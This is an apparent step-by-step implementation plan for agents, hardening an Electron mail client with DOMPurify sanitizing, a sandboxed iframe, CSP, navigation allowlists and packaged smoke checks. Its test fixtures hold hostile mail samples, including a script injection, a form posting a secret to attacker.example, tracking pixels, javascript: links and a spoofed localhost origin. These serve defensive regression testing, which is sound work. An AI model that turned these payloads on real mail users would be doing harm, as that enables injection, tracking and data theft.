# Renderer Security Boundary Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Isolate untrusted mail HTML from the React renderer and enable Electron's renderer sandbox without breaking the preload bridge or Windows release startup.

**Architecture:** Mail HTML is sanitized in one renderer module, wrapped in a restrictive self-contained document, and rendered in a sandboxed `srcDoc` iframe. The application shell receives its own CSP, the preload is emitted as CommonJS for Electron sandbox compatibility, and pure navigation/window policies are covered by Vitest before release smoke validates the packaged bridge.

**Tech Stack:** Electron 35, React 19, TypeScript 5, DOMPurify 3, Vitest 4, jsdom 29, Electron Builder 26.

---

## File Structure

- Create `src/mail-content-security.ts`: DOMPurify policy, remote-resource filtering, and isolated mail document builder.
- Create `tests/mail-content-security.test.ts`: jsdom-backed security regression tests for hostile mail HTML.
- Modify `src/components/MailReader.tsx`: replace renderer DOM injection with a sandboxed iframe.
- Modify `src/styles.css`: size the isolated mail frame without changing the surrounding reader layout.
- Create `electron/main/navigation-policy.ts`: pure allowlist decisions for application and external navigation.
- Create `tests/navigation-policy.test.ts`: protocol and local-file navigation tests.
- Modify `electron/main/navigation-guard.ts`: consume the tested pure navigation policy.
- Create `electron/main/window-security.ts`: frozen secure BrowserWindow preferences.
- Create `tests/electron-security-config.test.ts`: BrowserWindow and application-CSP regression checks.
- Rename `electron/preload/index.ts` to `electron/preload/index.cts`: emit a sandbox-compatible `.cjs` preload.
- Modify `electron/main/index.ts`: use `.cjs` preload and enable the tested secure preferences.
- Modify `electron/tsconfig.json`: include `.cts` sources.
- Modify `src/vite-env.d.ts`: resolve the renamed preload type through its emitted `.cjs` name.
- Modify `index.html`: add the application-shell CSP before any executable resource.
- Create `scripts/evaluate-cdp.mjs`: evaluate a bounded expression against the packaged renderer over CDP.
- Modify `scripts/verify-release-startup.ps1`: verify the bridge exists, Node globals are absent, and CSP is active.
- Modify `package.json` and `package-lock.json`: add exact jsdom test dependency while preserving the user's icon-path hunk.

## Task 1: Lock Mail HTML Security Behavior

**Files:**
- Create: `tests/mail-content-security.test.ts`
- Create: `src/mail-content-security.ts`
- Modify: `package.json`
- Modify: `package-lock.json`

- [x] **Step 1: Install the jsdom test runtime**

Run:

```powershell
npm.cmd install --save-dev --save-exact jsdom@29.1.1 --registry=https://registry.npmjs.org/
```

Expected: exit `0`; Node `22.13.1` satisfies jsdom's declared engine range.

- [x] **Step 2: Write the failing hostile-mail tests**

Create `tests/mail-content-security.test.ts`:

```ts
/** @vitest-environment jsdom */

import { describe, expect, it } from "vitest";
import { buildMailHtmlDocument, sanitizeMailHtml, sanitizeMailStyle } from "../src/mail-content-security";

describe("sanitizeMailHtml", () => {
  it("blocks executable markup and remote tracking resources", () => {
    const sanitized = sanitizeMailHtml(`
      <script>window.pwned = true</script>
      <form action="https://attacker.example/collect"><input name="secret"></form>
      <img data-kind="remote" src="https://tracker.example/pixel.gif">
      <div data-kind="styled" style="color: red; background-image: url(https://tracker.example/bg.png)">hello</div>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector("script, form, input")).toBeNull();
    expect(template.content.querySelector('[data-kind="remote"]')?.getAttribute("src")).toBeNull();
    expect(template.content.querySelector('[data-kind="styled"]')?.getAttribute("style")).toBe("color: red");
    expect(sanitized).not.toContain("tracker.example");
  });

  it("keeps embedded images and routes approved links through a new window", () => {
    const sanitized = sanitizeMailHtml(`
      <img data-kind="embedded" src="data:image/png;base64,AA==">
      <a data-kind="safe" href="https://example.com/message">open</a>
      <a data-kind="unsafe" href="javascript:alert(1)">bad</a>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector('[data-kind="embedded"]')?.getAttribute("src")).toBe("data:image/png;base64,AA==");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("target")).toBe("_blank");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(template.content.querySelector('[data-kind="unsafe"]')?.getAttribute("href")).toBeNull();
  });
});

describe("mail document policy", () => {
  it("removes CSS URL loads and embeds a restrictive document CSP", () => {
    expect(sanitizeMailStyle("font-weight: bold; background: url('https://tracker.example/a')")).toBe("font-weight: bold");
    const documentHtml = buildMailHtmlDocument("<p>safe</p>");
    expect(documentHtml).toContain("default-src 'none'");
    expect(documentHtml).toContain("img-src data: cid:");
    expect(documentHtml).toContain('<meta name="referrer" content="no-referrer">');
  });
});
```

- [x] **Step 3: Run the tests to verify RED**

Run:

```powershell
npm.cmd test -- tests/mail-content-security.test.ts
```

Expected: FAIL because `src/mail-content-security.ts` does not exist.

- [x] **Step 4: Implement the centralized mail policy**

Create `src/mail-content-security.ts` with these exported behaviors:

```ts
import createDOMPurify from "dompurify";

const purifier = createDOMPurify(window);
const DATA_IMAGE = /^data:image\/(?:png|gif|jpe?g|webp);base64,[a-z0-9+/=\s]+$/i;
const CID_IMAGE = /^cid:[^\s]+$/i;
const EXTERNAL_LINK = /^(?:https?|mailto|tel):/i;

export const MAIL_DOCUMENT_CSP =
  "default-src 'none'; img-src data: cid:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; object-src 'none'";

export function sanitizeMailStyle(value: string) {
  return value
    .split(";")
    .map((declaration) => declaration.trim())
    .filter(Boolean)
    .filter((declaration) => !/(?:url\s*\(|@import|expression\s*\(|-moz-binding)/i.test(declaration))
    .join("; ");
}

purifier.addHook("uponSanitizeAttribute", (node, event) => {
  const tagName = node.tagName.toLowerCase();
  const attributeName = event.attrName.toLowerCase();

  if (attributeName === "style") {
    event.attrValue = sanitizeMailStyle(event.attrValue);
  }
  if (tagName === "img" && attributeName === "src" && !DATA_IMAGE.test(event.attrValue) && !CID_IMAGE.test(event.attrValue)) {
    event.keepAttr = false;
  }
  if (tagName === "a" && attributeName === "href" && !EXTERNAL_LINK.test(event.attrValue)) {
    event.keepAttr = false;
  }
});

purifier.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName.toLowerCase() === "a" && node.hasAttribute("href")) {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});

export function sanitizeMailHtml(content: string) {
  return purifier.sanitize(content, {
    USE_PROFILES: { html: true },
    SANITIZE_NAMED_PROPS: true,
    FORBID_TAGS: [
      "script", "style", "iframe", "object", "embed", "form", "input", "button", "textarea", "select", "option",
      "meta", "link", "base", "video", "audio", "source", "track"
    ],
    FORBID_ATTR: ["srcset", "background", "formaction"],
    ADD_ATTR: ["target", "rel"],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel|cid):|data:image\/(?:png|gif|jpe?g|webp);base64,)/i
  });
}

export function buildMailHtmlDocument(sanitizedHtml: string) {
  return `<!doctype html><html><head><meta charset="UTF-8"><meta http-equiv="Content-Security-Policy" content="${MAIL_DOCUMENT_CSP}"><meta name="referrer" content="no-referrer"><style>html,body{margin:0;padding:0;background:#fff;color:#17262a;font:14px/1.68 "Segoe UI",sans-serif;overflow-wrap:anywhere}img{max-width:100%;height:auto}pre{white-space:pre-wrap}</style></head><body>${sanitizedHtml}</body></html>`;
}
```

- [x] **Step 5: Run focused and full verification**

Run:

```powershell
npm.cmd test -- tests/mail-content-security.test.ts
npm.cmd test
npm.cmd run typecheck
```

Expected: hostile-mail tests pass; the full suite and both type checks exit `0`.

- [x] **Step 6: Commit without the user's icon-path hunk**

Stage the new module/test, lockfile, and only the jsdom dependency hunk from `package.json`. Confirm the cached package diff excludes `build.win.icon`.

```powershell
git commit -m "security: isolate mail content policy"
```

## Task 2: Render Mail in a Sandboxed Document

**Files:**
- Modify: `src/components/MailReader.tsx`
- Modify: `src/styles.css`

- [x] **Step 1: Replace renderer HTML injection**

Import `buildMailHtmlDocument` and `sanitizeMailHtml`, compute `mailDocument`, then replace `dangerouslySetInnerHTML` with:

```tsx
<iframe
  className="mail-content-frame"
  title="邮件正文"
  sandbox="allow-popups"
  referrerPolicy="no-referrer"
  srcDoc={mailDocument}
/>
```

Plain-text mail remains a React `<pre>` and is therefore escaped by default.

- [x] **Step 2: Give the iframe stable reader dimensions**

Add:

```css
.reader-body {
  min-height: 0;
}

.mail-paper {
  height: 100%;
}

.mail-content-frame {
  display: block;
  width: 100%;
  height: 100%;
  min-height: 480px;
  border: 0;
  background: #fff;
}
```

- [x] **Step 3: Verify the renderer no longer has a mail HTML sink**

Run:

```powershell
rg -n "dangerouslySetInnerHTML|DOMPurify" src/components/MailReader.tsx
npm.cmd test
npm.cmd run typecheck
npm.cmd run build
```

Expected: `rg` finds neither pattern in `MailReader.tsx`; tests, type checks, and build exit `0`.

- [x] **Step 4: Commit the rendering boundary**

```powershell
git add src/components/MailReader.tsx src/styles.css
git commit -m "security: sandbox rendered mail html"
```

## Task 3: Test and Centralize Navigation Policy

**Files:**
- Create: `tests/navigation-policy.test.ts`
- Create: `electron/main/navigation-policy.ts`
- Modify: `electron/main/navigation-guard.ts`

- [x] **Step 1: Write failing navigation tests**

Create `tests/navigation-policy.test.ts`:

```ts
import path from "node:path";
import { pathToFileURL } from "node:url";
import { describe, expect, it } from "vitest";
import { isAllowedAppNavigation, isAllowedExternalUrl } from "../electron/main/navigation-policy.js";

describe("isAllowedExternalUrl", () => {
  it.each(["https://example.com", "http://example.com", "mailto:user@example.com", "tel:+10000000000"])(
    "allows approved external URL %s",
    (url) => expect(isAllowedExternalUrl(url)).toBe(true)
  );

  it.each(["javascript:alert(1)", "data:text/html,hello", "file:///tmp/a", "httpsx://example.com", "not a URL"])(
    "rejects unsafe external URL %s",
    (url) => expect(isAllowedExternalUrl(url)).toBe(false)
  );
});

describe("isAllowedAppNavigation", () => {
  it("allows only the exact packaged file", () => {
    const allowedPath = path.resolve("dist/index.html");
    expect(isAllowedAppNavigation(pathToFileURL(allowedPath).href, null, allowedPath)).toBe(true);
    expect(isAllowedAppNavigation(pathToFileURL(path.resolve("dist/other.html")).href, null, allowedPath)).toBe(false);
  });

  it("allows only the exact development origin", () => {
    expect(isAllowedAppNavigation("http://127.0.0.1:5173/inbox", "http://127.0.0.1:5173", null)).toBe(true);
    expect(isAllowedAppNavigation("http://127.0.0.1.evil.test:5173/", "http://127.0.0.1:5173", null)).toBe(false);
  });
});
```

- [x] **Step 2: Run the focused test to verify RED**

```powershell
npm.cmd test -- tests/navigation-policy.test.ts
```

Expected: FAIL because `electron/main/navigation-policy.ts` does not exist.

- [x] **Step 3: Move pure decisions into the tested module**

Export `isAllowedExternalUrl(url)` and `isAllowedAppNavigation(url, appOrigin, allowedFilePath)` from the new module. Keep exact protocol equality, `new URL(url).origin === appOrigin`, and normalized `fileURLToPath` equality. Import both functions from `navigation-guard.ts`; do not widen the allowlist.

- [x] **Step 4: Run verification and commit**

```powershell
npm.cmd test -- tests/navigation-policy.test.ts
npm.cmd test
npm.cmd run typecheck
git add electron/main/navigation-policy.ts electron/main/navigation-guard.ts tests/navigation-policy.test.ts
git commit -m "security: centralize navigation allowlists"
```

## Task 4: Enable the Electron Renderer Sandbox

**Files:**
- Create: `electron/main/window-security.ts`
- Create: `tests/electron-security-config.test.ts`
- Rename: `electron/preload/index.ts` to `electron/preload/index.cts`
- Modify: `electron/main/index.ts`
- Modify: `electron/tsconfig.json`
- Modify: `src/vite-env.d.ts`
- Modify: `index.html`

- [x] **Step 1: Write failing BrowserWindow and CSP tests**

Create `tests/electron-security-config.test.ts`:

```ts
import { readFile } from "node:fs/promises";
import { describe, expect, it } from "vitest";
import { SECURE_WEB_PREFERENCES } from "../electron/main/window-security.js";

describe("renderer security configuration", () => {
  it("enables isolation and sandboxing without Node integration", () => {
    expect(SECURE_WEB_PREFERENCES).toEqual({
      contextIsolation: true,
      nodeIntegration: false,
      sandbox: true
    });
  });

  it("places a restrictive CSP before the application script", async () => {
    const html = await readFile(new URL("../index.html", import.meta.url), "utf8");
    const cspIndex = html.indexOf('http-equiv="Content-Security-Policy"');
    const scriptIndex = html.indexOf('<script type="module"');
    const csp = html.match(/http-equiv="Content-Security-Policy"[\s\S]*?content="([^"]+)"/)?.[1] || "";

    expect(cspIndex).toBeGreaterThan(-1);
    expect(cspIndex).toBeLessThan(scriptIndex);
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp.match(/script-src[^;]*/)?.[0]).not.toMatch(/'unsafe-inline'|'unsafe-eval'/);
  });
});
```

- [x] **Step 2: Run the focused test to verify RED**

```powershell
npm.cmd test -- tests/electron-security-config.test.ts
```

Expected: FAIL because `window-security.ts` and the CSP do not exist.

- [x] **Step 3: Add secure preferences and application CSP**

Create:

```ts
export const SECURE_WEB_PREFERENCES = Object.freeze({
  contextIsolation: true,
  nodeIntegration: false,
  sandbox: true
});
```

Add this early in `index.html`:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' ws://127.0.0.1:*; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'"
/>
```

- [x] **Step 4: Emit and load a CommonJS preload**

Rename the preload source to `index.cts`, add `"**/*.cts"` to the Electron tsconfig include list, update the BrowserWindow preload path to `../preload/index.cjs`, and spread `SECURE_WEB_PREFERENCES` into `webPreferences`. Update the renderer type-only import to `../electron/preload/index.cjs`.

- [x] **Step 5: Verify source tests and compiled output**

```powershell
npm.cmd test -- tests/electron-security-config.test.ts
npm.cmd test
npm.cmd run typecheck
npm.cmd run build:electron
Get-ChildItem dist-electron/preload
```

Expected: tests and type checks pass; the preload directory contains `index.cjs` and does not contain `index.js`.

- [x] **Step 6: Commit the sandbox boundary**

```powershell
git add -A -- electron/preload electron/main/window-security.ts electron/main/index.ts electron/tsconfig.json src/vite-env.d.ts index.html tests/electron-security-config.test.ts
git commit -m "security: enable renderer sandbox and csp"
```

## Task 5: Verify the Packaged Security Boundary

**Files:**
- Create: `scripts/evaluate-cdp.mjs`
- Modify: `scripts/verify-release-startup.ps1`
- Modify: this plan only when recording results.

- [x] **Step 1: Add a bounded CDP evaluator**

Create `scripts/evaluate-cdp.mjs`:

```js
const [endpoint, expression] = process.argv.slice(2);
const endpointUrl = new URL(endpoint || "about:blank");

if (endpointUrl.protocol !== "ws:" || endpointUrl.hostname !== "127.0.0.1" || !expression) {
  throw new Error("CDP evaluator requires a ws://127.0.0.1 endpoint and expression");
}

const socket = new WebSocket(endpointUrl);

function withTimeout(promise) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("CDP operation timed out")), 10_000);
    promise.then(
      (value) => {
        clearTimeout(timer);
        resolve(value);
      },
      (error) => {
        clearTimeout(timer);
        reject(error);
      }
    );
  });
}

try {
  await withTimeout(new Promise((resolve, reject) => {
    socket.addEventListener("open", resolve, { once: true });
    socket.addEventListener("error", () => reject(new Error("CDP connection failed")), { once: true });
  }));

  const response = withTimeout(new Promise((resolve, reject) => {
    socket.addEventListener("message", (event) => {
      const message = JSON.parse(String(event.data));
      if (message.id !== 1) return;
      if (message.error || message.result?.exceptionDetails) {
        reject(new Error("CDP evaluation failed"));
        return;
      }
      resolve(message.result?.result?.value ?? null);
    });
  }));

  socket.send(JSON.stringify({
    id: 1,
    method: "Runtime.evaluate",
    params: { expression, returnByValue: true, awaitPromise: true }
  }));
  process.stdout.write(JSON.stringify(await response));
} finally {
  if (socket.readyState < WebSocket.CLOSING) socket.close();
}
```

- [x] **Step 2: Extend packaged startup assertions**

After locating the page target, evaluate:

```js
(async () => ({
  hasBridge: typeof window.outlookManager?.settings?.get === "function",
  settingsReadable: Boolean(await window.outlookManager?.settings?.get()),
  hasNodeProcess: typeof globalThis.process !== "undefined",
  csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || ""
}))()
```

Fail unless `hasBridge` and `settingsReadable` are true, `hasNodeProcess` is false, and CSP contains `object-src 'none'`.

Add the assertions immediately after selecting `$page`:

```powershell
$securityExpression = @'
(async () => ({
  hasBridge: typeof window.outlookManager?.settings?.get === "function",
  settingsReadable: Boolean(await window.outlookManager?.settings?.get()),
  hasNodeProcess: typeof globalThis.process !== "undefined",
  csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || ""
}))()
'@
$securityJson = & node (Join-Path $Root "scripts\evaluate-cdp.mjs") $page.webSocketDebuggerUrl $securityExpression
if ($LASTEXITCODE -ne 0) {
  throw "Renderer security evaluation failed."
}
$security = $securityJson | ConvertFrom-Json
if (-not $security.hasBridge -or -not $security.settingsReadable -or $security.hasNodeProcess) {
  throw "Packaged renderer security boundary is not active."
}
if (-not $security.csp.Contains("object-src 'none'")) {
  throw "Packaged renderer CSP is missing object-src 'none'."
}
```

- [x] **Step 3: Run every release gate**

```powershell
npm.cmd test
npm.cmd run typecheck
npm.cmd audit --omit=dev --registry=https://registry.npmjs.org/
npm.cmd run build
npm.cmd run dist:win
```

Expected: all tests pass, both type checks pass, production audit reports zero vulnerabilities, build succeeds, and packaged smoke confirms the sandboxed bridge and CSP.

- [x] **Step 4: Record and commit verification**

Mark all plan checkboxes complete and append test count, audit result, build result, preload artifact name, smoke security fields, and release artifact names. Commit only scripts and the plan:

```powershell
git add scripts/evaluate-cdp.mjs scripts/verify-release-startup.ps1 docs/superpowers/plans/2026-07-18-renderer-security-boundary.md
git commit -m "test: verify packaged renderer security"
```

## Verification Record (2026-07-18)

- `npm.cmd test`: 8 test files passed, 28 tests passed.
- `npm.cmd run typecheck`: renderer and Electron TypeScript checks passed.
- `npx.cmd --yes npm@11.18.0 audit --omit=dev --registry=https://registry.npmjs.org/`: found 0 vulnerabilities. The installed npm 9.8.1 client could not be used because its retired quick-audit endpoint returned HTTP 400.
- `npm.cmd run build`: Vite 6.4.2 transformed 1,639 modules and both renderer and Electron builds completed.
- Preload output: `dist-electron/preload/index.cjs` exists and no `index.js` preload was emitted.
- `npm.cmd run dist:win`: electron-builder 26.15.3 packaged Electron 35.7.5 for Windows x64 and exited 0.
- Packaged smoke: `bridge=True`, `settings=True`, `nodeProcess=False`, `cspObjectNone=True`; SQLite creation and executable icon checks passed.
- Release artifacts: `Outlook Manager 0.1.7.exe`, `Outlook Manager Setup 0.1.7.exe`, `Outlook Manager Setup 0.1.7.exe.blockmap`, and `latest.yml`.
